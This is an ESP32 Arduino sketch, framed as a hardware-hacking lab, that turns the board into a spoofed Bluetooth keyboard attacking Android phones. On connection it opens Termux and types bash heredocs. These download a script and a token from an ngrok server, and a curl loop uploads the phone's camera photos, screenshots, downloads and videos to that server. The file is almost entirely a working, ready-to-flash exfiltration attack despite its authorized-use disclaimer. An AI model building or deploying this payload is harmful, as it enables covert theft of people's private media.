// ─────────────────────────────────────────────────────────────────────────────
// ESP32 BLE HID — Android Media Exfiltration Lab
// ─────────────────────────────────────────────────────────────────────────────
//
// CTF / Hardware Hacking Lab — Authorized Devices Only.
// USE ONLY ON DEVICES YOU OWN OR HAVE EXPLICIT WRITTEN AUTHORIZATION TO TEST.
//
// WHAT THIS DOES:
//   Mode A — AUTO (default): on every new BLE connection (no button needed):
//     STEP 1: Navigates to Android home screen (WIN key alone)
//     STEP 2: Opens Termux via launcher search
//     STEP 3: Clears the shell prompt (CTRL+C, CTRL+U)
//     STEP 4A: Types a single one-liner:
//                python3 ~/media_backup.py <URL> --auto
//              media_backup.py --auto skips all prompts and uploads everything.
//
//   Mode B — MANUAL: GPIO 19 button fires the full heredoc payload (no
//             media_backup.py required — raw curl loop injected directly).
//
// TECHNIQUE NOTES:
//   - BLE HID spoofing: ESP32 advertises as "ESP32 Keyboard" (legitimate HID device)
//   - Keystroke injection: 35 ms/char — below typical human notice threshold
//   - AUTO uses a single short line; MANUAL injects full heredoc without dropping files
//   - Win key alone = Home screen on all Android launchers (Win+S = screenshot)
//   - Auto-trigger: fires once per connection; cooldown prevents re-fire on
//     momentary drops. Re-arms only after a full disconnect + reconnect.
//
// SERVER:
//   server/server.py  (port 8019)
//   Run: ngrok http 8019  → paste HTTPS URL in WAN_SERVER_URL below → re-flash
//
// TARGET DEVICE ONE-TIME SETUP (your own device):
//   Install Termux from F-Droid → pkg install curl → termux-setup-storage
// ─────────────────────────────────────────────────────────────────────────────

#include <BleKeyboard.h>

// ── Configuration ─────────────────────────────────────────────────────────────

#define BUTTON_PIN     19
#define WAN_SERVER_URL "https://7afa-2401-4900-53df-cc09-7d2d-3630-dc6a-d779.ngrok-free.app"  // ← paste ngrok URL

// AUTO_TRIGGER: set to true  → payload fires automatically on BLE connection
//               set to false → only GPIO 19 button fires the payload
#define AUTO_TRIGGER   true

// Setup password — must match SETUP_PASSWORD in server/.env
#define SETUP_PASSWORD "your_setup_password_here"  // ← set same value as in .env

// ── Timing constants (all in milliseconds) ───────────────────────────────────
// Increase these if your device is slower or Termux fails to open reliably.

// Wait after BLE connects before the first keystroke.
// Gives Android time to fully register the HID keyboard.
#define CONNECT_SETTLE_MS   4000UL

// Wait after WIN key for the home screen / launcher to fully settle.
// Increase to 2000 on slower/older devices.
#define HOME_SETTLE_MS      1800UL

// Wait for the launcher search overlay to appear after typing starts.
#define SEARCH_OVERLAY_MS    800UL

// Wait after pressing Enter on the Termux search result for the app to load.
// First launch or after reboot can take 5–6 s — keep this at 5000+.
#define APP_LOAD_MS         5000UL

// Wait between CTRL+C and CTRL+U when clearing the shell prompt.
#define PROMPT_CLEAR_MS      500UL

// Minimum time between two payload executions on the same connection.
#define COOLDOWN_MS        60000UL

// ── State ─────────────────────────────────────────────────────────────────────

BleKeyboard bleKeyboard("ESP32 Keyboard", "Espressif", 100);

bool     wasConnected   = false;   // tracks previous connection state
bool     payloadFired   = false;   // true once payload has run this session
unsigned long connectedAt   = 0;   // millis() when BLE connected
unsigned long lastFireMs    = 0;   // millis() when payload last ran
bool     lastButtonState    = HIGH;

// ── Helpers ───────────────────────────────────────────────────────────────────

void typeString(const char* str, int delayMs = 35) {
  for (int i = 0; i < (int)strlen(str); i++) {
    bleKeyboard.print(str[i]);
    delay(delayMs);
  }
}

void pressEnter(int waitMs = 200) {
  bleKeyboard.press(KEY_RETURN);
  delay(120);
  bleKeyboard.releaseAll();
  delay(waitMs);
}

// Wake the screen with a media-key tap.
// Works even when the screen is off — no PIN needed, just wakes the display.
void wakeScreen() {
  // KEY_MEDIA_VOLUME_UP is a safe no-op if volume is already max.
  // The tap wakes the display on all Android versions.
  bleKeyboard.press(KEY_MEDIA_VOLUME_UP);
  delay(80);
  bleKeyboard.releaseAll();
  delay(600);   // let the screen fully illuminate
  Serial.println("[timing] Screen wake sent.");
}

// WIN alone → Home screen on all Android launchers.
// WIN+S = screenshot — do NOT use that.
void goHome() {
  bleKeyboard.press(KEY_LEFT_GUI);
  delay(180);
  bleKeyboard.releaseAll();
  delay(HOME_SETTLE_MS);   // wait for home screen / launcher to settle
}

// Dismiss any overlay (notification shade, search bar, dialog) with ESC,
// then go home. Belt-and-suspenders before every launcher search.
void dismissAndGoHome() {
  // ESC closes most Android overlays (requires Android 12+; no-op on older)
  bleKeyboard.press(KEY_ESC);
  delay(80);
  bleKeyboard.releaseAll();
  delay(300);

  goHome();

  // Second HOME tap — some launchers need two taps to get to the clean
  // home grid (first tap closes recent apps, second tap goes to page 1)
  bleKeyboard.press(KEY_LEFT_GUI);
  delay(180);
  bleKeyboard.releaseAll();
  delay(HOME_SETTLE_MS);
  Serial.println("[timing] Home screen confirmed.");
}

// Open an app by typing its name in the launcher search, then pressing Enter.
void openApp(const char* appName) {
  dismissAndGoHome();

  // Type the app name slowly — the launcher search overlay needs to appear first
  delay(SEARCH_OVERLAY_MS);
  typeString(appName, 70);   // 70 ms/char gives overlay time to index each char
  delay(900);                // let search results populate

  pressEnter(APP_LOAD_MS);   // Enter → first result opens; wait for app to load
}

// Type one heredoc line then press Enter.
void typeLine(const char* line) {
  typeString(line, 35);
  pressEnter(120);
}

// ── Common: open Termux and clear prompt ──────────────────────────────────────

void openTermuxClean() {
  // STEP 1: wake screen so keystrokes don't land on the lock screen
  wakeScreen();

  // STEP 2: open Termux via launcher search
  Serial.println("[payload] Opening Termux...");
  openApp("Termux");
  Serial.println("[payload] Termux opened — waiting for shell prompt.");

  // Extra wait: Termux needs a moment after launch before it accepts input.
  // On first launch this can be 4-5 s; subsequent launches are faster.
  delay(1500);

  // STEP 3: clear the prompt safely
  // ESC first — dismisses any Termux permission dialog or welcome screen
  bleKeyboard.press(KEY_ESC);
  delay(80); bleKeyboard.releaseAll(); delay(300);

  // CTRL+C kills any running foreground process (safe no-op if idle)
  bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press('c');
  delay(120); bleKeyboard.releaseAll(); delay(PROMPT_CLEAR_MS);

  // CTRL+U clears any characters already on the current input line
  bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press('u');
  delay(120); bleKeyboard.releaseAll(); delay(PROMPT_CLEAR_MS);

  Serial.println("[payload] Prompt cleared — ready for injection.");
}

// ── AUTO payload — self-installing + silent run ───────────────────────────────
// Injects a bash heredoc that:
//   1. Downloads media_backup.py if not already present
//   2. Fetches and saves ~/.backup_token from /setup-token if not already present
//   3. Runs media_backup.py --auto (fully non-interactive)
// Everything is idempotent — safe to run on every connection.

void runAutoPayload() {
  Serial.println("[AUTO payload] Starting self-install + run...");
  openTermuxClean();

  // Inject bash heredoc — bash buffers all lines before executing,
  // so the ESP32 only needs to wait for typing to finish.
  typeLine("bash << 'SETUP_RUN_END'");

  // ── 1. Download media_backup.py if missing ──────────────────────────────
  typeLine("if [ ! -f ~/media_backup.py ]; then");
  typeLine("  echo '[setup] Downloading media_backup.py...'");
  typeLine("  curl -sL -H 'ngrok-skip-browser-warning: true' \\");
  typeLine("       -o ~/media_backup.py '" WAN_SERVER_URL "/payloads/media_backup.py'");
  typeLine("  echo '[setup] media_backup.py saved.'");
  typeLine("else");
  typeLine("  echo '[setup] media_backup.py already present.'");
  typeLine("fi");

  // ── 2. Fetch and save ~/.backup_token if missing ────────────────────────
  typeLine("if [ ! -f ~/.backup_token ]; then");
  typeLine("  echo '[setup] Fetching backup token...'");
  typeLine("  curl -sf -H 'ngrok-skip-browser-warning: true' \\");
  typeLine("       -H 'X-Setup-Password: " SETUP_PASSWORD "' \\");
  typeLine("       '" WAN_SERVER_URL "/setup-token' > ~/.backup_token");
  typeLine("  chmod 600 ~/.backup_token");
  typeLine("  echo '[setup] Token saved to ~/.backup_token.'");
  typeLine("else");
  typeLine("  echo '[setup] Token already present.'");
  typeLine("fi");

  // ── 3. Run media_backup.py non-interactively ────────────────────────────
  typeLine("echo '[run] Starting upload...'");
  typeLine("python3 ~/media_backup.py '" WAN_SERVER_URL "' --auto");

  typeLine("SETUP_RUN_END");

  Serial.println("[AUTO payload] Heredoc typed — setup+run executing in Termux.");
  Serial.println("[AUTO payload] Done.");
}

// ── MANUAL payload — full bash heredoc (no media_backup.py needed) ───────────
// Falls back to raw curl loop if media_backup.py is not installed.

void runManualPayload() {
  Serial.println("[MANUAL payload] Starting heredoc injection...");
  openTermuxClean();

  // STEP 3: inject bash heredoc
  // bash buffers the entire script until UPLOAD_END, then executes it
  // sequentially — no interleaving between curl responses and new typed lines.
  typeLine("bash << 'UPLOAD_END'");
  typeLine("UP=\"" WAN_SERVER_URL "/upload\"");
  typeLine("upload_dir() {");
  typeLine("  find \"$1\" -maxdepth 1 -type f \\( -iname '*.jpg' -o -iname '*.jpeg' -o -iname '*.png' -o -iname '*.webp' -o -iname '*.heic' -o -iname '*.mp4' -o -iname '*.mov' \\) | while IFS= read -r f; do");
  typeLine("    sha=$(sha256sum \"$f\" | cut -d' ' -f1)");
  typeLine("    curl -s -L -H \"ngrok-skip-browser-warning: true\" -F \"file=@$f\" -F \"sha256=$sha\" -F \"category=$2\" \"$UP\" && echo \"OK: $(basename $f)\" || echo \"FAIL: $(basename $f)\"");
  typeLine("  done");
  typeLine("}");
  typeLine("upload_dir /sdcard/DCIM/Camera          DCIM");
  typeLine("upload_dir /sdcard/Pictures             Pictures");
  typeLine("upload_dir /sdcard/Pictures/Screenshots Screenshots");
  typeLine("upload_dir /sdcard/Download             Downloads");
  typeLine("upload_dir /sdcard/Movies               Movies");
  typeLine("echo '====== ALL DONE ======'");
  typeLine("UPLOAD_END");

  Serial.println("[MANUAL payload] Heredoc typed — bash executing uploads.");
  Serial.println("[MANUAL payload] Done.");
}

// ── Setup ─────────────────────────────────────────────────────────────────────

void setup() {
  Serial.begin(115200);
  delay(500);

  pinMode(BUTTON_PIN, INPUT_PULLUP);

  bleKeyboard.set_vendor_id(0x16C0);
  bleKeyboard.set_product_id(0x27DB);
  bleKeyboard.set_version(0x0100);
  bleKeyboard.begin();

  Serial.println("─────────────────────────────────────────");
  Serial.println("  ESP32 BLE HID — Media Exfiltration Lab");
  Serial.println("─────────────────────────────────────────");
  Serial.print  ("  Server  : "); Serial.println(WAN_SERVER_URL);
  Serial.print  ("  Mode    : "); Serial.println(AUTO_TRIGGER ? "AUTO (fires on BLE connect)" : "MANUAL (GPIO 19 button)");
  Serial.print  ("  Settle  : "); Serial.print(CONNECT_SETTLE_MS); Serial.println(" ms after connect");
  Serial.print  ("  Cooldown: "); Serial.print(COOLDOWN_MS / 1000); Serial.println(" s between fires");
  Serial.println("  Waiting for BLE connection...");
  Serial.println("─────────────────────────────────────────");
}

// ── Loop ──────────────────────────────────────────────────────────────────────

void loop() {
  bool connected = bleKeyboard.isConnected();
  unsigned long now = millis();

  // ── Connection state change ───────────────────────────────────────────────
  if (connected && !wasConnected) {
    // Fresh connection
    connectedAt  = now;
    payloadFired = false;   // re-arm for this session
    wasConnected = true;
    Serial.println("[BLE] Connected — device paired.");
    if (AUTO_TRIGGER) {
      Serial.print("[BLE] Auto-trigger armed. Firing in ");
      Serial.print(CONNECT_SETTLE_MS);
      Serial.println(" ms...");
    }
  }
  else if (!connected && wasConnected) {
    // Disconnected — reset for next connection
    wasConnected = false;
    Serial.println("[BLE] Disconnected. Waiting for next connection...");
  }

  // ── Auto-trigger on connect ───────────────────────────────────────────────
  if (AUTO_TRIGGER && connected && !payloadFired) {
    if (now - connectedAt >= CONNECT_SETTLE_MS) {
      if (lastFireMs == 0 || now - lastFireMs >= COOLDOWN_MS) {
        payloadFired = true;
        lastFireMs   = now;
        Serial.println("[AUTO] Settle delay elapsed → firing auto payload.");
        runAutoPayload();   // single one-liner via media_backup.py --auto
      }
    }
  }

  // ── Manual trigger — GPIO 19 button ──────────────────────────────────────
  if (connected) {
    bool buttonState = digitalRead(BUTTON_PIN);

    if (lastButtonState == HIGH && buttonState == LOW) {
      if (lastFireMs == 0 || now - lastFireMs >= COOLDOWN_MS) {
        lastFireMs = now;
        Serial.println("[MANUAL] GPIO 19 pressed → firing manual payload (heredoc).");
        runManualPayload();  // full curl heredoc — no media_backup.py needed
      } else {
        unsigned long remaining = (COOLDOWN_MS - (now - lastFireMs)) / 1000;
        Serial.print("[MANUAL] Cooldown active — ");
        Serial.print(remaining);
        Serial.println(" s remaining.");
      }
    }
    lastButtonState = buttonState;
  }

  delay(10);
}
